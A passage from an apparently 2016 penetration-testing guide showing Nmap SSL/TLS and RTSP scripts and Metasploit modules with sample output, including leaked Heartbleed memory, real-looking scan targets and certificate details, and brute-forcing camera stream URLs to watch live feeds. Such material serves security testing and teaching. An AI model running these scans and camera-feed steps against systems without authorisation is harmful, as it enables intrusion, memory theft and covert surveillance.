<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 - Heartbeat response with leak
</span><span class='line'>[*] 10.10.xx.xx:443 - Heartbeat data stored in /root/.msf5/loot/20160403185025_default_10.10.235.69_openssl.heartble_299937.bin
</span><span class='line'>
</span><span class='line'>hexdump -C /root/.msf5/loot/20160403185025_default_10.10.xx.xx_openssl.heartble_299937.bin | more 
</span><span class='line'>00000000  02 ff ff 94 03 01 57 00  0f a8 cf 31 3f 02 84 0b  |......W....1?...|
</span><span class='line'>00000010  59 9a d1 6b 3b 20 7b 7b  75 6b 17 2c 03 8d 8d 6a  |Y..k; \{\{uk.,...j|
</span><span class='line'>00000020  77 de b2 3a e3 28 00 00  66 c0 14 c0 0a c0 22 c0  |w..:.(..f.....".|
</span><span class='line'>00000030  21 00 39 00 38 00 88 00  87 00 87 c0 0f 00 35 00  |!.9.8.........5.|
</span><span class='line'>00000040  84 c0 12 c0 08 c0 1c c0  1b 00 16 00 13 c0 0d c0  |................|
</span><span class='line'>00000050  03 00 0a c0 13 c0 09 c0  1f c0 1e 00 33 00 32 00  |............3.2.|
</span><span class='line'>00000060  9a 00 99 00 45 00 44 c0  0e c0 04 00 2f 00 96 00  |....E.D...../...|
</span><span class='line'>00000070  41 c0 11 c0 07 c0 0c c0  02 00 05 00 04 00 15 00  |A...............|
</span><span class='line'>00000080  12 00 09 00 14 00 11 00  08 00 06 00 03 00 ff 01  |................|
</span><span class='line'>00000090  00 00 05 00 0f 00 01 01  06 03 02 03 04 02 02 02  |................|
</span><span class='line'>000000a0  07 c0 0c c0 02 00 05 00  04 00 15 00 12 00 09 00  |................|
</span><span class='line'>000000b0  ff 02 01 00 00 85 00 00  00 12 00 10 00 00 0d 32  |...............1|
</span><span class='line'>000000c0  32 33 2e 33 30 2e 32 33  35 2e 36 36 00 0b 00 04  |10.10.xx.xx....|
</span><span class='line'>000000d0  03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19  |.......4.2......|
</span><span class='line'>000000e0  00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08  |................|
</span><span class='line'>000000f0  00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13  |................|
</span><span class='line'>00000100  00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00  |.............#..|
</span><span class='line'>00000110  00 0d 00 22 00 20 06 01  06 02 06 03 05 01 05 02  |...". ..........|
</span><span class='line'>00000120  05 03 04 01 04 02 04 03  03 01 03 02 03 03 02 01  |................|
</span><span class='line'>00000130  02 02 02 03 01 01 00 0f  00 01 01 00 00 00 00 00  |................|
</span><span class='line'>00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap NSE</strong>:
Nmap has around</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-cert.html">ssl-cert.nse</a>: Retrieves a server's SSL certificate. The amount of information printed about the certificate depends on the verbosity level. With no extra verbosity, the script prints the validity period and the commonName, organizationName, stateOrProvinceName, and countryName of the subject.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -sC -p 443 10.10.xx.xx -n -vv
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up, received reset ttl 60 (0.011s latency).
</span><span class='line'>Scanned at 2016-04-03 18:58:50 IST for 57s
</span><span class='line'>PORT    STATE SERVICE  REASON         VERSION
</span><span class='line'>443/tcp open  ssl/http syn-ack ttl 53 Apache httpd
</span><span class='line'>| ssl-cert: Subject: commonName=astarouflex.flexfilm.com/organizationName=Uflex/countryName=in/localityName=Noida
</span><span class='line'>| Issuer: commonName=virstech WebAdmin CA/organizationName=virstech/countryName=in/emailAddress=g@gmail.com/localityName=dehli
</span><span class='line'>| Public Key type: rsa
</span><span class='line'>| Public Key bits: 1024
</span><span class='line'>| Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'>| Not valid before: 2013-02-01T13:27:36
</span><span class='line'>| Not valid after:  2038-01-01T00:00:01
</span><span class='line'>| MD5:   c213 2536 95b4 0fbd 0784 5a68 f2c0 3979
</span><span class='line'>| SHA-1: 5f8d 5cf5 6f5c 8b23 dc49 83ec 6251 b050 3fda 997e
</span><span class='line'>| -----BEGIN CERTIFICATE-----
</span><span class='line'>| MIIDOTCCAqKgAwIBAgIJANqxAruC7sYGMA0GCSqGSIb3DQEBBQUAMGsxCzAJBgNV
</span><span class='line'>| BAYTAmluMQ4wDAYDVQQHEwVkZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNV
</span><span class='line'>| BAMTFHZpcnN0ZWNoIFdlYkFkbWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWls
</span><span class='line'>| LmNvbTAeFw0xMzAyMDExMzI3MzZaFw0zODAxMDEwMDAwMDFaMFAxCzAJBgNVBAYT
</span><span class='line'>| AmluMQ4wDAYDVQQHEwVOb2lkYTEOMAwGA1UEChMFVWZsZXgxITAfBgNVBAMTGGFz
</span><span class='line'>| dGFyb3VmbGV4LmZsZXhmaWxtLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkC
</span><span class='line'>| gYEAl09PwQfNKGMaqzD7CYLMQOskqMcP6MXJcPuHBl8wFte4M4yDzRTGJwEjmv9u
</span><span class='line'>| mcvv2HShww0nMXS2XEosjy65I2NqRBBFQ/+DmXtdiuoiWBeMk0OhV94fgSwDnhB/
</span><span class='line'>| 83RYyzKGMfKwOb63ovp8D78ufysPxqL8O49o+1bFMQYCoW0CAwEAAaOB/zCB/DAd
</span><span class='line'>| BgNVHQ4EFgQUvgIR5fXbkeXtnlT4jjKuhnUHacgwgZ0GA1UdIwSBlTCBkoAUGIfJ
</span><span class='line'>| GJvPoIGIJDyq9tgpKxU3gJihb6RtMGsxCzAJBgNVBAYTAmluMQ4wDAYDVQQHEwVk
</span><span class='line'>| ZWhsaTERMA8GA1UEChMIdmlyc3RlY2gxHTAbBgNVBAMTFHZpcnN0ZWNoIFdlYkFk
</span><span class='line'>| bWluIENBMRowGAYJKoZIhvcNAQkBFgtnQGdtYWlsLmNvbYIJANqxAruC7sYCMCMG
</span><span class='line'>| A1UdEQQcMBqCGGFzdGFyb3VmbGV4LmZsZXhmaWxtLmNvbTAJBgNVHRMEAjAAMAsG
</span><span class='line'>| A1UdDwQEAwIF4DANBgkqhkiG9w0BAQUFAAOBgQAentiShYI/t/XkWZrMe2E98RMs
</span><span class='line'>| yoD+BgYGxe6Gwn+L3pbb8oM5bxxmkydwVENNVrOG+kp1imU75HYge4QtHldjFf0y
</span><span class='line'>| i0myyr1jZ2IcnidcaYm/LhOFIUUmuP5YwDRK6jpIuJvzjDRcDxL63E9r950/f4jn
</span><span class='line'>| DrGIgqEJr7O9HKO7Tw==
</span><span class='line'>|_-----END CERTIFICATE-----</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params.nse</a>: Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services.

This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral Diffie-Hellman as the key exchange algorithm.

Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability to Logjam (CVE 2015-4000) and other weaknesses.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=ssl-dh-params -p 443 10.10.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:08 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.013s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-dh-params: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   Diffie-Hellman Key Exchange Insufficient Group Strength
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|       Transport Layer Security (TLS) services that use Diffie-Hellman groups of
</span><span class='line'>|       insufficient strength, especially those using one of a few commonly shared
</span><span class='line'>|       groups, may be susceptible to passive eavesdropping attacks.
</span><span class='line'>|     Check results:
</span><span class='line'>|       WEAK DH GROUP 1
</span><span class='line'>|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
</span><span class='line'>|             Modulus Type: Safe prime
</span><span class='line'>|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
</span><span class='line'>|             Modulus Length: 1024
</span><span class='line'>|             Generator Length: 8
</span><span class='line'>|             Public Key Length: 1024
</span><span class='line'>|     References:
</span><span class='line'>|_      https://weakdh.org
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-google-cert-catalog.html">ssl-google-cert-catalog.nse</a>: Queries Google's Certificate Catalog for the SSL certificates retrieved from target hosts.

The Certificate Catalog provides information about how recently and for how long Google has seen the given certificate. If a certificate doesn't appear in the database, despite being correctly signed by a well-known CA and having a matching domain name, it may be suspicious.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-google-cert-catalog 223.30.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:14 IST
</span><span class='line'>Nmap scan report for 223.30.xx.xx
</span><span class='line'>Host is up (0.028s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-google-cert-catalog: 
</span><span class='line'>|_  No DB entry</span></code></pre></td></tr></table></div></figure>

</li>
<li><a href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2.nse</a>: Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it supports.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script sslv2 115.124.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:24 IST
</span><span class='line'>Nmap scan report for 115.124.xx.xx
</span><span class='line'>Host is up (0.0088s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection.nse</a>: Detects whether a server is vulnerable to the SSL/TLS "CCS Injection" vulnerability (CVE-2014-0224). There's a metasploit module for the same: openssl_ccs</li>
<li><a href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date.nse</a>: Retrieves a target host's time and date from its TLS ServerHello response.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-date 115.124.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:29 IST
</span><span class='line'>Nmap scan report for 115.124.xx.xx
</span><span class='line'>Host is up (0.017s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>|_ssl-date: 2016-04-03T18:49:19+00:00; +4h49m42s from scanner time.</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html">ssl-enum-ciphers.nse</a>: Script repeatedly initiates SSLv3/TLS connections, each time trying a new cipher or compressor while recording whether a host accepts or rejects it. The end result is a list of all the ciphersuites and compressors that a server accepts.

Each ciphersuite is shown with a letter grade (A through F) indicating the strength of the connection. The grade is based on the cryptographic strength of the key exchange and of the stream cipher.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-enum-ciphers 115.124.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:33 IST
</span><span class='line'>Nmap scan report for 115.124.xx.xx
</span><span class='line'>Host is up (0.0085s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-enum-ciphers: 
</span><span class='line'>|   SSLv3: 
</span><span class='line'>|     ciphers: 
</span><span class='line'>|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E
</span><span class='line'>|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_128_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_256_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_DES_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_MD5 - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_SHA - F
</span><span class='line'>|     compressors: 
</span><span class='line'>|       NULL
</span><span class='line'>|     cipher preference: client
</span><span class='line'>|     warnings: 
</span><span class='line'>|       CBC-mode cipher in SSLv3 (CVE-2014-3566)
</span><span class='line'>|       Ciphersuite uses MD5 for message integrity
</span><span class='line'>|       Insecure certificate signature: MD5
</span><span class='line'>|   TLSv1.0: 
</span><span class='line'>|     ciphers: 
</span><span class='line'>|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 - E
</span><span class='line'>|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 - E
</span><span class='line'>|       TLS_RSA_WITH_3DES_EDE_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_128_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_AES_256_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_DES_CBC_SHA - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_MD5 - F
</span><span class='line'>|       TLS_RSA_WITH_RC4_128_SHA - F
</span><span class='line'>|     compressors: 
</span><span class='line'>|       NULL
</span><span class='line'>|     cipher preference: client
</span><span class='line'>|     warnings: 
</span><span class='line'>|       Ciphersuite uses MD5 for message integrity
</span><span class='line'>|       Insecure certificate signature: MD5
</span><span class='line'>|_  least strength: F
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds</span></code></pre></td></tr></table></div></figure>
</li>


<li>
<a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed.nse</a>: Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-heartbleed 223.30.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:35 IST
</span><span class='line'>Nmap scan report for 223.30.xx.xx
</span><span class='line'>Host is up (0.011s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-heartbleed: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|     Risk factor: High
</span><span class='line'>|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
</span><span class='line'>|           
</span><span class='line'>|     References:
</span><span class='line'>|       http://cvedetails.com/cve/2014-0160/
</span><span class='line'>|       http://www.openssl.org/news/secadv_20140407.txt 
</span><span class='line'>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li>
<a href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle.nse</a>: Checks whether SSLv3 CBC ciphers are allowed (POODLE). POODLE is CVE-2014-3566
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 443 --script ssl-poodle 223.30.xx.xx -n
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 19:40 IST
</span><span class='line'>Nmap scan report for 223.30.xx.xx
</span><span class='line'>Host is up (0.011s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>443/tcp open  https
</span><span class='line'>| ssl-poodle: 
</span><span class='line'>|   VULNERABLE:
</span><span class='line'>|   SSL POODLE information leak
</span><span class='line'>|     State: VULNERABLE
</span><span class='line'>|     IDs:  CVE:CVE-2014-3566  OSVDB:113251
</span><span class='line'>|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and
</span><span class='line'>|           other products, uses nondeterministic CBC padding, which makes it easier
</span><span class='line'>|           for man-in-the-middle attackers to obtain cleartext data via a
</span><span class='line'>|           padding-oracle attack, aka the "POODLE" issue.
</span><span class='line'>|     Disclosure date: 2014-10-14
</span><span class='line'>|     Check results:
</span><span class='line'>|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA
</span><span class='line'>|     References:
</span><span class='line'>|       https://www.openssl.org/~bodo/ssl-poodle.pdf
</span><span class='line'>|       http://osvdb.org/113251
</span><span class='line'>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
</span><span class='line'>|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span></code></pre></td></tr></table></div></figure>

</li>
</ol>


<h3>RTSP | Port 554 and 8554</h3>

<p><strong>Nmap</strong> has two NSE for RTSP which are</p>

<ol>
<li>
<a href="https://nmap.org/nsedoc/scripts/rtsp-methods.html">rtsp-methods.nse</a> :which determines which methods are supported by the RTSP (real time streaming protocol) server
<br>
<br>
RTSP-Methods Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-01 23:17 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx (10.10.22.195)
</span><span class='line'>Host is up (0.015s latency).
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>8554/tcp open  rtsp    Geovision webcam rtspd
</span><span class='line'>|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
</span><span class='line'>Service Info: Device: webcam</span></code></pre></td></tr></table></div></figure>
</li>
<li><a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.
<br>
<br>
RTSP URL Brute Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 10.152.77.206
</span><span class='line'>Host is up (0.00047s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>554/tcp open  rtsp
</span><span class='line'>| rtsp-url-brute: 
</span><span class='line'>|   Discovered URLs
</span><span class='line'>|     rtsp://10.152.77.206/media/video1
</span><span class='line'>|_    rtsp://10.152.77.206/video1
</span></code></pre></td></tr></table></div></figure>
Once you have this, just execute mplayer to watch the live feed
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mplayer &lt;url&gt;
</span><span class='line'>for example: mplayer rtsp://10.152.77.206/media/video1</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>Rsync | Port 873</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -p 873 -u -S rsync -R</span></code></pre></td></tr></table></div></figure>


<p><strong>Metasploit</strong> has</p>

<ol>
<li>
<strong>List Rsync Modules</strong>: An rsync module is essentially a directory share. These modules can optionally be protected by a password. This module connects to and negotiates with an rsync server, lists the available modules and,  optionally, determines if the module requires a password to access.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
